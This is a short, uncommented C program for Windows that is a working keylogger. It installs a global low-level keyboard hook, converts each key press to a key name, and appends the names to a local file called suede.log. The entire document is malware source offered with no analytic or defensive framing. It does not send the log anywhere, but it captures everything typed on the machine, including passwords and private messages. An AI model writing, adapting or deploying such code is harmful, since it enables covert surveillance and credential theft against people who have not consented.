#include <stdio.h>
#include <windows.h>
HHOOK hk;

LRESULT KeyEvent(int hc, WPARAM id, KBDLLHOOKSTRUCT * kd) {
  DWORD mesg = 1;
  switch (id) {
    case WM_KEYDOWN:
    case WM_SYSKEYDOWN:
      mesg += kd->scanCode << 16;
      mesg += kd->flags << 24;
      char kn[] = "Windows Right";
      GetKeyNameText(mesg, kn, sizeof kn);
      FILE * fpt = fopen("suede.log", "a");
      fprintf(fpt, "_%s", kn);
      fflush(fpt);
  }
  return CallNextHookEx(hk, hc, id, (LPARAM) kd);
}

int main() {
  hk = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeyEvent, 0, 0);
  while (1) {
    GetMessage(0, 0, 0, 0);
  }
}
